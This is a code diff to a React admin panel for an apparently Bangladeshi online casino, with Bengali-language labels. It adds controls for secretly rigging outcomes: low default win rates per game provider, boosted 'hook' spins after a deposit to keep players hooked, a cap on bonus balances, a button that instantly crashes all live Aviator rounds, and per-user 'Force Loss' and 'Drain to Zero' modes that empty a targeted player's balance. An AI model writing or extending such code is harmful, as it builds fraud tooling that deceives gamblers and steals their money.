+                  >
+                    <Check className="w-3.5 h-3.5" />
+                    <span>Save Platform Settings</span>
+                  </button>
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5">
+                  {/* Signup Bonus */}
+                  <div className="bg-[#0d1117] border border-[#21262d] rounded-xl p-3.5 space-y-1.5">
+                    <span className="text-[11px] font-bold text-[#8b949e] block">1. Sign-up Bonus Amount (৳):</span>
+                    <input
+                      type="number"
+                      min="0"
+                      max="500"
+                      value={signupBonusInput}
+                      onChange={e => setSignupBonusInput(Number(e.target.value))}
+                      className="w-full bg-[#161b22] border border-[#30363d] focus:border-[#F5BE00] rounded-xl px-3 py-1.5 text-xs font-mono font-black text-[#F5BE00] focus:outline-none"
+                    />
+                    <span className="text-[9px] text-slate-400 block">নতুন অ্যাকাউন্ট খুললে অটো ৳৫০ মূল ব্যালেন্সে যোগ হবে</span>
+                  </div>
+
+                  {/* Min Withdrawal Limit */}
+                  <div className="bg-[#0d1117] border border-[#21262d] rounded-xl p-3.5 space-y-1.5">
+                    <span className="text-[11px] font-bold text-[#8b949e] block">2. Min Withdrawal Limit (৳):</span>
+                    <input
+                      type="number"
+                      min="100"
+                      max="5000"
+                      value={minWithdrawInput}
+                      onChange={e => setMinWithdrawInput(Number(e.target.value))}
+                      className="w-full bg-[#161b22] border border-[#30363d] focus:border-[#F5BE00] rounded-xl px-3 py-1.5 text-xs font-mono font-black text-white focus:outline-none"
+                    />
+                    <span className="text-[9px] text-slate-400 block">এই ব্যালেন্সের নিচে ইউজার উইথড্র সাবমিট করতে পারবে না</span>
+                  </div>
+
+                  {/* Max Balance Cap for Bonus Users */}
+                  <div className="bg-[#0d1117] border border-[#21262d] rounded-xl p-3.5 space-y-1.5">
+                    <span className="text-[11px] font-bold text-[#8b949e] block">3. Bonus Balance Cap (Max ৳):</span>
+                    <input
+                      type="number"
+                      min="100"
+                      max="1000"
+                      value={bonusCapInput}
+                      onChange={e => setBonusCapInput(Number(e.target.value))}
+                      className="w-full bg-[#161b22] border border-[#30363d] focus:border-[#F5BE00] rounded-xl px-3 py-1.5 text-xs font-mono font-black text-rose-400 focus:outline-none"
+                    />
+                    <span className="text-[9px] text-slate-400 block">ডিপোজিট না করা ইউজারের ব্যালেন্স ৳১৯৯ এর উপরে কখনোই উঠবে না</span>
+                  </div>
+
+                  {/* Company Profit Retention % */}
+                  <div className="bg-[#0d1117] border border-[#21262d] rounded-xl p-3.5 space-y-1.5">
+                    <div className="flex justify-between items-center">
+                      <span className="text-[11px] font-bold text-[#8b949e]">4. Profit Retention:</span>
+                      <span className="text-xs font-mono font-black text-[#F5BE00]">{companyRetentionInput}%</span>
+                    </div>
+                    <input
+                      type="range"
+                      min="50"
+                      max="95"
+                      step="1"
+                      value={companyRetentionInput}
+                      onChange={e => setCompanyRetentionInput(Number(e.target.value))}
+                      className="w-full accent-[#F5BE00] cursor-pointer h-1.5 bg-slate-800 rounded-lg"
+                    />
+                    <span className="text-[9px] text-slate-400 block">মোট ডিপোজিটের ৭৫% প্রফিট প্ল্যাটফর্মে সংরক্ষিত থাকবে</span>
+                  </div>
+
+                  {/* Hook Spins Count */}
+                  <div className="bg-[#0d1117] border border-[#21262d] rounded-xl p-3.5 space-y-1.5">
+                    <span className="text-[11px] font-bold text-[#8b949e] block">5. First Spins Boost Count:</span>
+                    <input
+                      type="number"
+                      min="1"
+                      max="30"
+                      value={hookSpinsCountInput}
+                      onChange={e => setHookSpinsCountInput(Number(e.target.value))}
+                      className="w-full bg-[#161b22] border border-[#30363d] focus:border-[#F5BE00] rounded-xl px-3 py-1.5 text-xs font-mono font-black text-emerald-400 focus:outline-none"
+                    />
+                    <span className="text-[9px] text-slate-400 block">ডিপোজিটের পর প্রথম ১০ স্পিন ৬৫-৭০% উইন রেট দিয়ে ইউজারকে ধরে রাখবে</span>
+                  </div>
+
+                  {/* Aviator Emergency & Next Crash */}
+                  <div className="bg-[#0d1117] border border-rose-500/30 rounded-xl p-3.5 space-y-2">
+                    <div className="flex justify-between items-center">
+                      <span className="text-[11px] font-bold text-white">6. Aviator Next Crash:</span>
+                      <span className="text-xs font-mono font-black text-rose-400">{aviatorNextCrashInput}x</span>
+                    </div>
+                    <div className="flex items-center space-x-2">
+                      <input
+                        type="number"
+                        min="1.01"
+                        max="20.0"
+                        step="0.05"
+                        value={aviatorNextCrashInput}
+                        onChange={e => setAviatorNextCrashInput(Number(e.target.value))}
+                        className="w-20 bg-[#161b22] border border-[#30363d] rounded-xl px-2 py-1 text-xs font-mono font-black text-white text-center focus:outline-none"
+                      />
+                      <button
+                        type="button"
+                        onClick={handleEmergencyCrashNow}
+                        disabled={isEmergencyCrashing}
+                        className={`flex-1 py-1 px-2 rounded-xl text-[10px] font-black uppercase tracking-wider transition active:scale-95 shadow cursor-pointer ${
+                          isEmergencyCrashing
+                            ? 'bg-rose-600 text-white animate-pulse'
+                            : 'bg-rose-500/20 hover:bg-rose-500 text-rose-300 hover:text-white border border-rose-500/40'
+                        }`}
+                      >
+                        {isEmergencyCrashing ? 'Crashing...' : '🚨 Crash Now!'}
+                      </button>
+                    </div>
+                    <span className="text-[9px] text-slate-400 block">প্রেস করলে সমস্ত চলন্ত বিমান সাথে সাথে ক্র্যাশ করবে</span>
+                  </div>
+                </div>
+
+                {/* SERVER & PROVIDER GLOBAL RTP CONTROLLER */}
+                <div className="pt-3 border-t border-[#21262d] space-y-2.5">
+                  <span className="text-xs font-black text-white block uppercase tracking-wider">
+                    Server & Game Provider Global RTP Controller (প্রোভাইডার ভিত্তিক উইন রেট)
+                  </span>
+                  <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-2.5">
+                    {[
+                      { key: 'jili', name: 'JILI Games', default: 20 },
+                      { key: 'pragmatic', name: 'Pragmatic Play', default: 20 },
+                      { key: 'pgsoft', name: 'PG Soft', default: 20 },
+                      { key: 'spribe', name: 'Spribe (Aviator)', default: 20 },
+                      { key: 'lottery', name: 'WinGo & Lottery', default: 25 }
+                    ].map(p => (
+                      <div key={p.key} className="bg-[#0d1117] border border-[#21262d] rounded-xl p-2.5 space-y-1">
+                        <div className="flex justify-between items-center text-[10px]">
+                          <span className="font-bold text-white truncate">{p.name}</span>
+                          <span className="font-mono font-black text-[#F5BE00]">{providerRtps[p.key] !== undefined ? providerRtps[p.key] : p.default}%</span>
+                        </div>
+                        <input
+                          type="range"
+                          min="0"
+                          max="100"
+                          step="1"
+                          value={providerRtps[p.key] !== undefined ? providerRtps[p.key] : p.default}
+                          onChange={e => {
+                            const val = Number(e.target.value);
+                            setProviderRtps(prev => ({ ...prev, [p.key]: val }));
+                          }}
+                          className="w-full accent-[#F5BE00] cursor-pointer h-1.5 bg-slate-800 rounded-lg"
+                        />
+                      </div>
+                    ))}
+                  </div>
+                </div>
               </div>
 
               {/* 1. Preset House Profit Modes */}
@@ -2806,25 +3216,30 @@ export default function AdminDashboard({ onExit }) {
                   </button>
                 </div>
 
-                {/* Personal Player Luck Mode Override */}
+                {/* Personal Player Luck Mode Override (4 Distinct Operational Modes) */}
                 <div className="bg-[#0d1117] border border-[#21262d] rounded-2xl p-4 space-y-3 shadow-inner">
                   <div className="flex items-center justify-between">
-                    <span className="text-xs font-black text-white">Individual User Luck Control (টার্গেটেড ইউজার কন্ট্রোল):</span>
+                    <span className="text-xs font-black text-white">Individual User Luck Control (টার্গেটেড ৪টি মোড):</span>
                     <span className={`text-[10px] font-black px-2.5 py-0.5 rounded-full uppercase ${
-                      userTargetLuckMode === 'drain' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40' :
-                      userTargetLuckMode === 'sweetener' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' :
+                      userTargetLuckMode === 'drain_to_zero' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40' :
+                      userTargetLuckMode === 'force_loss' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40' :
+                      userTargetLuckMode === 'force_win' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' :
                       'bg-yellow-500/20 text-yellow-400 border border-yellow-500/40'
                     }`}>
-                      {userTargetLuckMode === 'drain' ? '🔴 ১০০% লস (Strict Drain)' : userTargetLuckMode === 'sweetener' ? '🟢 ট্রিকল উইন (Sweetener)' : '🟡 কন্ট্রোলড (Controlled)'}
+                      {userTargetLuckMode === 'drain_to_zero' ? '🔴 ০% ড্রেন (Drain to Zero)' : 
+                       userTargetLuckMode === 'force_loss' ? '🟠 ১০০% লস (Force Loss)' : 
+                       userTargetLuckMode === 'force_win' ? '🟢 ৬৫% উইন (Force Win)' : 
+                       '🟡 নরমাল (Normal 20%)'}
                     </span>
                   </div>
 
-                  {/* 3 Quick Mode Buttons */}
-                  <div className="grid grid-cols-3 gap-2">
+                  {/* 4 Quick Mode Buttons */}
+                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                     {[
-                      { id: 'controlled', label: 'Controlled (ডিফল্ট ২০%)', wr: 20 },
-                      { id: 'drain', label: 'Strict Drain (১০০% লস)', wr: 5 },
-                      { id: 'sweetener', label: 'Sweetener (ট্রিকল উইন)', wr: 40 }
+                      { id: 'normal', label: 'Normal', desc: 'ডিফল্ট ২০% RTP', wr: 20 },
+                      { id: 'force_win', label: 'Force Win', desc: '৬৫% বুস্ট উইন', wr: 65 },
+                      { id: 'force_loss', label: 'Force Loss', desc: '১০০% লস (ক্র্যাশ)', wr: 5 },
+                      { id: 'drain_to_zero', label: 'Drain to 0', desc: 'ব্যালেন্স শূন্য করুন', wr: 0 }
                     ].map(mode => (
                       <button
                         key={mode.id}
@@ -2839,8 +3254,10 @@ export default function AdminDashboard({ onExit }) {
                             : 'bg-[#161b22] text-[#8b949e] hover:text-white border border-[#21262d]'
                         }`}
                       >
-                        <span>{mode.label}</span>
-                        {userTargetLuckMode === mode.id && <span className="text-[9px] text-slate-950 font-black mt-0.5">● সিলেক্টেড</span>}
+                        <span className="leading-tight">{mode.label}</span>
+                        <span className={`text-[9px] mt-0.5 ${userTargetLuckMode === mode.id ? 'text-slate-950 font-black' : 'text-slate-400'}`}>
+                          {mode.desc}
+                        </span>
                       </button>
                     ))}
                   </div>
@@ -2848,13 +3265,13 @@ export default function AdminDashboard({ onExit }) {
                   {/* Targeted Custom Win Rate Slider & Number Input */}
                   <div className="pt-2 border-t border-[#21262d]/60 space-y-1.5">
                     <div className="flex items-center justify-between text-xs">
-                      <span className="text-[#8b949e]">সুনির্দিষ্ট টার্গেট উইন রেট (Target Win Chance %):</span>
+                      <span className="text-[#8b949e]">সুনির্দিষ্ট টার্গেট উইন রেট (Target RTP %):</span>
                       <span className="text-yellow-400 font-mono font-black text-sm">{userTargetWinRate}%</span>
                     </div>
                     <div className="flex items-center space-x-3">
                       <input
                         type="range"
-                        min="1"
+                        min="0"
                         max="100"
                         value={userTargetWinRate}
                         onChange={(e) => setUserTargetWinRate(Number(e.target.value))}
@@ -2862,7 +3279,7 @@ export default function AdminDashboard({ onExit }) {
                       />
                       <input
                         type="number"
-                        min="1"
+                        min="0"
                         max="100"
                         value={userTargetWinRate}
                         onChange={(e) => setUserTargetWinRate(Number(e.target.value))}
@@ -2880,8 +3297,10 @@ export default function AdminDashboard({ onExit }) {
                       await updateUserLuckMode(selectedUser.uid, userTargetLuckMode, userTargetWinRate);
                       setSelectedUser(prev => prev ? ({
                         ...prev,
+                        force_mode: userTargetLuckMode,
                         luck_mode: userTargetLuckMode,
-                        force_result: userTargetLuckMode === 'drain' ? 'force_lose' : (userTargetLuckMode === 'sweetener' ? 'force_win' : 'normal'),
+                        force_result: (userTargetLuckMode === 'drain_to_zero' || userTargetLuckMode === 'force_loss') ? 'force_lose' : (userTargetLuckMode === 'force_win' ? 'force_win' : 'normal'),
+                        custom_rtp: userTargetWinRate,
                         custom_win_rate: userTargetWinRate
                       }) : null);
                       setIsSavingTarget(false);
